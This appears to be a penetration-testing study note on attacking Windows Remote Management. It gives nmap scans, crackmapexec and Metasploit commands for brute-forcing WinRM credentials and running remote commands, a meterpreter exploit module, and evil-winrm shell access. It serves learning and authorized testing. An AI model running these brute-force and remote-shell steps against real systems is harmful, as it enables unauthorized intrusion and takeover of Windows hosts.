# Exploiting WinRM
> Windows Remote Management (WinRM) Protocol: This is a feature that exists within the Windows O/S. BUT, it is NOT configured to run by DEFAULT. It needs to be explicitly configured and enabled.

WinRM Default Ports:  `5985` (http) and `5986` (https)

## Contents
- [Intro](#intro)
  - [WinRM Usage Model](#winrm-usage-model)
  - [Exploiting WinRM](#exploiting-winrm-1)
- [Exploit](#exploit)
  - [Nmap Scan](#nmap-scan)
  - [crackmapexec](#crackmapexec)
  - [MSF: winrm_login](#msf-winrm_login)
  - [MSF: winrm_auth_methods](#msf-winrm_auth_methods)
  - [MSF: winrm_script_exec](#msf-winrm_script_exec)
  - [Ruby Script: evil-winrm](#ruby-script-evil-winrm)

## Intro

### WinRM Usage Model
- WinRM is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP/HTTPS.
- Microsoft implemented WinRM in Windows to make life easier for system administrators.
- WinRM is typically used for:
  - Remotely accessing and interacting with Windows hosts on a local network.
  - You can also configure WinRM to work over the Internet (login to a server, etc.).
  - Remotely access and execute commands on Windows systems.
  - Manage and configure Windows systems remotely.
- WinRM typically used TCP port 5985 (http) and 5986 (https) by default.

### Exploiting WinRM

#### Steps:
1. Brute-force login creds with crackmapexec.
2. Exploit with evil-winrm or MetaSploit

#### Explanation:
- WinRM implements access control and security for communication between systems through various forms of authentication.
  - This could be a simple username/password combo.
  - You could also provide the user account username and a password hash.
- We can utilize a utility called `crackmapexec` to perform a brute-force attack on WinRM in order to identifiy users and their passwords as well as execute commands on the target system.
- We can also utilize a ruby script called `evil-winrm` to obtain a command shell session on the target system.
- We can also utilize MetaSploit to get a meterpreter session. 

## Exploit

### Nmap Scan
```
nmap -sS -sV -sC -O -T4 -p- [target ip]
# or
nmap -sV -p 5985-5986 [target ip]        # (which kinda seems like cheating)
```
- The `-sV` should be sufficient.
- Problem: WinRM ports (5985, 5986) do not fall within the 1000 most common ports scanned by nmap.
- Solution: Do a `-p-` scan and wait it out.
- NOTE: Don't accept the nmap result for the VERSION of WinRM as what you actually have.
  - WinRM does not provide banner information for versions, etc.
  - Nmap gives a best guess.

### [crackmapexec](https://ptestmethod.readthedocs.io/en/latest/cme.html)
> CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.
- Supported Protocols: WinRM, MSSQL, SMB, SSH

#### For help:
```
crackmapexec -h
crackmapexec winrm -h    # for help specific to the winrm protocol
crackmapexec smb -h      # for help specific to the smb protocol (etc.)
```

#### General Syntax:
```
crackmapexec <protocol> <target(s)> -u username -p password
```

#### Examples:
```
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
# or
crackmapexec <protocol> <target(s)> -u='username' -p='Admin!123@'
```

#### Brute-Force:
```
crackmapexec winrm [target ip] -u administrator -p /usr/share/.../unix_passwords.txt
```
- You can use the `-u` switch to specify a file of possible user names to try.
- But, if we can get into the admin account, we don't have to do priv esc
- You should get a green `[+]` if successful.
- Look over the output (from the top down):
  - First line: you can see it actually connects to WinRM (wsman is an implementation of WinRM: windows management).
  - If you successfully found login credentials, you can crackmapexec to execute arbitrary Windows commands on the target machine...

#### Execute Commands:
```
crackmapexec winrm [target ip] -u administrator -p [password] -x "whoami"
crackmapexec winrm [target ip] -u administrator -p [password] -x "systeminfo"
```
- You should get some happy feedback along with the results of your command execution.
- The `systeminfo` command a takes while to run but provides a lot of information about your target system.


### MSF: winrm_login
- You can brute-force login creds with MetaSploit, also...
```
> use auxiliary/scanner/winrm/winrm_login
> set RHOSTS
> set USER_FILE /path/to/file
> set PASS_FILE /path/to/file
> set VERBOSE false
> run
```

### MSF: winrm_auth_methods
- You may need to find out what authentication methods your WinRM server allows: 
```
use auxiliary/scanner/winrm/winrm_auth_methods
```

### MSF: winrm_script_exec
- Obtaining a meterpreter session.
- NOTE: This module requires credentials, so you'll need to perform the brute-force attack first.
```
> search winrm_script
> use exploit/windows/winrm/winrm_script_exec
> show options
  # change what you need to: RHOSTS, etc. 
  # check your default payload and change if necessary (depending on your target system)
> set FORCE_VBS true
  #  this forces the use of a VBS Command Stager
> set username...
> set password...
> exploit
```
- You should get a meterpreter session. If it did not work, you'll have to keep trying.
- **_Remember to to set the `FORCE_VBS` to "true."_**

### Ruby Script: [evil-winrm](https://github.com/Hackplayers/evil-winrm)
> Ruby Script to Obtain Command Shell Session
```
evil-winrm.rb -u administrator -p '[password]' -i [target ip]
```
- This should automagically provide you with a command shell session. Test it out with...
```
whoami
ipconfig
net user
systeminfo
```
